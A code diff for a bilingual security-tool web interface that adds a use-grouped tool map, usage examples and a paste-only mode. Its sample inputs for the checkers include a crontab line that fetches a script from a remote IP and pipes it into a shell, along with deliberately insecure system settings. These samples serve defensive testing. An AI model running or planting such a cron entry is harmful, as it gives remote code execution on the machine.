@@ -35,7 +35,13 @@
       tbFieldProblem: "The tool couldn't accept “{f}”. Check it and try again.", tbBadInput: "The tool couldn't accept this input. Check the fields marked * and try again.",
       tbRejectedTitle: "Nothing was checked", tbNeedOneOf: "This tool needs at least one of: {f}.", tbInconclusive: "The tool couldn't reach a conclusion from what it was given.",
       tbFilePath: "File name", tbFilePathPh: "for example .github/workflows/ci.yml", tbFileContent: "Paste the file's contents here", tbAddFile: "Add another file", tbPickFiles: "Choose files…", tbRemoveFile: "Remove this file",
-      tbFileN: "File {n}" },
+      tbFileN: "File {n}",
+      tbByUse: "By what you want to do", tbByCat: "By category", tbExLabel: "Example:", tbExFile: "a sample file", tbExFiles: "a sample {f}",
+      tbPasteOnly: "Paste-only on the website", tbPasteNote: "Here this tool reads only what you paste (an export or a list). Reading this computer itself works in the desktop app.",
+      tbUses: [["link", "Check a link or a website", "Before you click, or before you trust a site"], ["email", "Check an email", "Is this message really from who it says?"],
+        ["file", "Check a file", "Documents, programs and archives, read and never run"], ["privacy", "Protect my privacy", "Find personal data, keys and trackers before you share"],
+        ["code", "Audit my code", "Common security mistakes, secrets and risky dependencies"], ["cloud", "Secure my cloud", "Configs for AWS, Docker, Kubernetes and CI"],
+        ["network", "Check my network", "Flows, configs and exposed services"], ["system", "Review my computer's setup", "Paste an export: tasks, start-up entries, firewall, updates"]] },
     ar: { navToolbox: "صندوق الأدوات", tbTitle: "صندوق أدوات CyberScan", tbLede: "أدوات أمنية حقيقية جاهزة للتشغيل: الملفات والبرمجيات الخبيثة والبريد والروابط والمواقع والكود والسحابة والخصوصية. كل أداة تحلّل ما تعطيها فقط، ولا تشغّل أي ملف.",
       tbTools: "أداة", tbCats: "فئة", tbAll: "الكل", tbSearch: "ابحث في الأدوات…", tbNone: "لا توجد أداة تطابق هذا البحث.", tbRun: "شغّل التحليل", tbRunning: "جارٍ التحليل…",
       tbExample: "جرّب مثالًا", tbClose: "إغلاق", tbBack: "كل الأدوات", tbPick: "اختر ملفًا", tbDrop: "أفلت ملفًا هنا أو انقر للاختيار", tbOrText: "أو الصق نصًا بدلًا منه",
@@ -49,7 +55,13 @@
       tbFieldProblem: "تعذّر على الأداة قبول «{f}». تحقق منه ثم أعد المحاولة.", tbBadInput: "تعذّر على الأداة قبول هذه المدخلات. تحقق من الحقول المعلّمة بـ * ثم أعد المحاولة.",
       tbRejectedTitle: "لم يُفحص شيء", tbNeedOneOf: "تحتاج هذه الأداة إلى واحد على الأقل من: {f}.", tbInconclusive: "لم تتمكن الأداة من الوصول إلى نتيجة مما أُعطي لها.",
       tbFilePath: "اسم الملف", tbFilePathPh: "مثلًا .github/workflows/ci.yml", tbFileContent: "الصق محتوى الملف هنا", tbAddFile: "أضف ملفًا آخر", tbPickFiles: "اختر ملفات…", tbRemoveFile: "أزل هذا الملف",
-      tbFileN: "الملف {n}" },
+      tbFileN: "الملف {n}",
+      tbByUse: "حسب ما تريد فعله", tbByCat: "حسب الفئة", tbExLabel: "مثال:", tbExFile: "ملف تجريبي", tbExFiles: "ملف {f} تجريبي",
+      tbPasteOnly: "باللصق فقط في الموقع", tbPasteNote: "هنا تقرأ هذه الأداة ما تلصقه فقط (تصدير أو قائمة). أما قراءة هذا الجهاز نفسه فمتاحة في تطبيق سطح المكتب.",
+      tbUses: [["link", "افحص رابطًا أو موقعًا", "قبل أن تنقر، أو قبل أن تثق بموقع"], ["email", "افحص رسالة بريد", "هل الرسالة حقًا ممن تدّعي؟"],
+        ["file", "افحص ملفًا", "مستندات وبرامج وأرشيفات، تُقرأ ولا تُشغَّل"], ["privacy", "احمِ خصوصيتك", "اعثر على البيانات الشخصية والمفاتيح والمتتبّعات قبل المشاركة"],
+        ["code", "دقّق الكود", "أخطاء أمنية شائعة وأسرار واعتماديات خطرة"], ["cloud", "أمّن السحابة", "إعدادات AWS وDocker وKubernetes وCI"],
+        ["network", "افحص شبكتك", "تدفقات وإعدادات وخدمات مكشوفة"], ["system", "راجع إعداد جهازك", "الصق تصديرًا: المهام وبرامج بدء التشغيل والجدار الناري والتحديثات"]] },
   };
   if (I && I.en && I.ar) { Object.assign(I.en, { navToolbox: STR.en.navToolbox }); Object.assign(I.ar, { navToolbox: STR.ar.navToolbox }); }
   const L = () => STR[CS.lang === "ar" ? "ar" : "en"];
@@ -94,6 +106,10 @@
   const tName = (tool) => { const a = AR(); return (a && a.tools[tool.id] && a.tools[tool.id][0]) || tool.name; };
   const tDesc = (tool) => { const a = AR(); return (a && a.tools[tool.id] && a.tools[tool.id][1]) || PLAIN_EN[tool.id] || tool.description; };
   const fName = (name) => { const a = AR(); return (a && a.fields[name]) || name.replace(/_/g, " "); };
+  // the tools map: what people want to do, not how the tools are filed
+  const USE_OF = { "url-domain-security": "link", "website-security": "link", "email-security": "email", "file-security": "file", "file-analysis": "file",
+    "malware-analysis": "file", "privacy-data-protection": "privacy", "code-dependency-security": "code", "cloud-infrastructure": "cloud",
+    "network-security": "network", "system-security": "system" };
   const catName = (c) => (CATS[c] ? CATS[c][CS.lang === "ar" ? "ar" : "en"] : c);
   const catHue = (c) => (CATS[c] ? CATS[c].hue : 200);
   const svgIcon = (d) => { const s = document.createElementNS("http://www.w3.org/2000/svg", "svg"); s.setAttribute("viewBox", "0 0 24 24"); s.setAttribute("aria-hidden", "true"); const p = document.createElementNS("http://www.w3.org/2000/svg", "path"); p.setAttribute("d", d); s.append(p); return s; };
@@ -149,6 +165,11 @@
     "cyberscan.network.service-exposure": { listening: "Proto Local Address State\nTCP 0.0.0.0:3389 LISTENING\nTCP 0.0.0.0:445 LISTENING\nTCP 127.0.0.1:5432 LISTENING\n" },
     "cyberscan.system.local-permissions": { ls_output: "-rwsr-xr-x 1 root root 12345 Jan 1 10:00 /usr/local/bin/helper\n-rw-rw-rw- 1 root root 220 Jan 1 10:00 /etc/app.conf\n-rw-r--r-- 1 user user 1675 Jan 1 10:00 /home/user/.ssh/id_rsa\n" },
     "cyberscan.url.dns_record_analyzer": { records: ["example.com. 300 IN TXT \"v=spf1 +all\"", "_dmarc.example.com. 300 IN TXT \"v=DMARC1; p=none\""] },
+    "cyberscan.system.firewall-config": { ufw: "Status: active\nDefault: allow (incoming), allow (outgoing), disabled (routed)\n\nTo                         Action      From\n--                         ------      ----\n22/tcp                     ALLOW IN    Anywhere\n3389/tcp                   ALLOW IN    Anywhere\n" },
+    "cyberscan.system.scheduled-tasks": { crontab: "*/5 * * * * curl -s http://198.51.100.7/a.sh | sh\n0 3 * * * /usr/bin/backup.sh\n" },
+    "cyberscan.system.config-auditor": { sysctl: "net.ipv4.ip_forward = 1\nkernel.randomize_va_space = 0\nnet.ipv4.conf.all.accept_redirects = 1\n" },
+    "cyberscan.system.installed-software": { software: [{ name: "Adobe Flash Player", version: "32.0.0.371", publisher: "Adobe" }, { name: "7-Zip", version: "9.20", publisher: "Igor Pavlov" }] },
+    "cyberscan.system.update-status": { os_release: "NAME=\"Ubuntu\"\nVERSION_ID=\"18.04\"\n", apt_upgradable: "openssl/bionic-security 1.1.1-1ubuntu2.1~18.04.23 amd64 [upgradable from: 1.1.1-1ubuntu2.1~18.04.5]\n" },
     "cyberscan.url.domain_expiration_checker": { expires_at: new Date(Date.now() + 9 * 86400000).toISOString().slice(0, 10) },
   };
   function example(name, schema, tool) {
@@ -190,9 +211,12 @@
   const search = el("input", "tb-search"); search.type = "search";
   bar.append(chips, search);
   const note = el("p", "tb-note"); note.hidden = true;
+  const modeBox = el("div", "tb-mode-box");
+  let viewMode = "use";
+  const mapBox = el("div", "tb-map");
   const empty = el("p", "tb-empty"); empty.hidden = true;
   const runner = el("div", "tb-runner"); runner.hidden = true;
-  shell.append(head, bar, note, grid, empty);
+  shell.append(head, modeBox, bar, note, mapBox, grid, empty);
   view.append(shell, runner);
 
   function paintHead() {
@@ -224,6 +248,14 @@
       return b;
     };
     chips.replaceChildren(make("all", L().tbAll, 200), ...cats.map((c) => make(c, catName(c), catHue(c))));
+    // the map (grouped by use) or the flat catalog
+    const seg = el("div", "tb-mode"); seg.setAttribute("role", "group");
+    [["use", L().tbByUse], ["cat", L().tbByCat]].forEach(([k, label]) => {
+      const b = el("button", `tb-mode-btn${viewMode === k ? " on" : ""}`, label); b.type = "button"; b.setAttribute("aria-pressed", String(viewMode === k));
+      b.addEventListener("click", () => { viewMode = k; if (k === "use") filterCat = "all"; buildChips(); renderGrid(); });
+      seg.append(b);
+    });
+    modeBox.replaceChildren(seg);
   }
   function setFilter(key) {
     filterCat = key;
@@ -241,16 +273,53 @@
     const nm = el("b", "tb-card-name", tName(tool)), ds = el("span", "tb-card-desc", tDesc(tool));
     nm.dir = ds.dir = "auto";                                  // tool texts are English: keep their own direction
     body.append(nm, ds);
-    const meta = el("span", "tb-card-meta", catName(tool.category));
+    const exText = usageExample(tool);
+    if (exText) { const ex = el("span", "tb-card-ex"); ex.append(el("b", "", L().tbExLabel + " "), el("code", "", exText)); ex.dir = "auto"; body.append(ex); }
+    const meta = el("span", "tb-card-meta", tool.paste_only ? L().tbPasteOnly : catName(tool.category));
     c.append(ico, body, meta);
     c.addEventListener("click", () => open(tool));
     c.addEventListener("pointermove", (e) => { const r = c.getBoundingClientRect(); c.style.setProperty("--mx", `${e.clientX - r.left}px`); c.style.setProperty("--my", `${e.clientY - r.top}px`); });
     cardFor.set(tool.id, c);
     return c;
   }
+  /* a short usage example per tool, from the same safe sample data the "Try an example" button fills */
+  function usageExample(tool) {
+    const props = (tool.input && tool.input.properties) || {};
+    const req = (tool.input && tool.input.required) || [];
+    const names = [...req, ...Object.keys(props).filter((n) => !req.includes(n))].filter((n) => n !== "source");
+    for (const n of names) {
+      const v = example(n, props[n] || {}, tool);
+      if (v === undefined) continue;
+      if (/base64$/.test(n)) return L().tbExFile;
+      if (Array.isArray(v) && v.length && v[0] && typeof v[0] === "object" && v[0].path) return L().tbExFiles.replace("{f}", v[0].path);
+      const txt = typeof v === "string" ? v : Array.isArray(v) ? v.map((x) => (typeof x === "string" ? x : JSON.stringify(x))).join(", ") : JSON.stringify(v);
+      const one = txt.replace(/\s+/g, " ").trim();
+      return one.length > 64 ? `${one.slice(0, 62)}…` : one;
+    }
+    return "";
+  }
+  function renderMap() {
+    const l = L();
+    mapBox.replaceChildren();
+    l.tbUses.forEach(([key, title, sub], gi) => {
+      const list = catalog.tools.filter((x) => (USE_OF[catOf(x)] || "file") === key);
+      if (!list.length) return;
+      const sec = el("section", "tb-use");
+      sec.style.setProperty("--h", catHue(catOf(list[0])));
+      const h = el("h2", "tb-use-title");
+      h.append(el("span", "tb-use-n", String(gi + 1).padStart(2, "0")), document.createTextNode(title), el("small", "", ` · ${list.length}`));
+      const g = el("div", "tb-grid");
+      g.append(...list.map(card));
+      sec.append(h, el("p", "tb-use-sub", sub), g);
+      mapBox.append(sec);
+    });
+  }
   function renderGrid() {
     if (!catalog) return;
     const q = query.trim().toLowerCase();
+    const grouped = viewMode === "use" && filterCat === "all" && !q;
+    mapBox.hidden = !grouped; grid.hidden = grouped;
+    if (grouped) { renderMap(); empty.hidden = true; return; }
     const list = catalog.tools.filter((x) => (filterCat === "all" || catOf(x) === filterCat) &&
       (!q || `${x.name} ${x.description} ${tName(x)} ${tDesc(x)} ${catName(x.category)} ${x.id}`.toLowerCase().includes(q)));
     const first = new Map([...grid.children].map((n) => [n, n.getBoundingClientRect()]));
@@ -342,7 +411,9 @@
     top.append(back, ico, title);
     const form = el("form", "tb-form"); form.noValidate = true;
     const getters = {};
+    if (tool.paste_only) { badges.append(el("span", "tb-badge", l.tbPasteOnly)); form.append(el("p", "tb-paste-note", l.tbPasteNote)); }
     Object.entries(props).forEach(([name, s]) => {
+      if (tool.paste_only && name === "source") return;    // the website reads only what is pasted
       const kind = fieldKind(name, s);
       const wrap = el("label", `tb-field k-${kind}`);
       const lab = el("span", "tb-field-name", fName(name) + (req.has(name) ? " *" : ""));
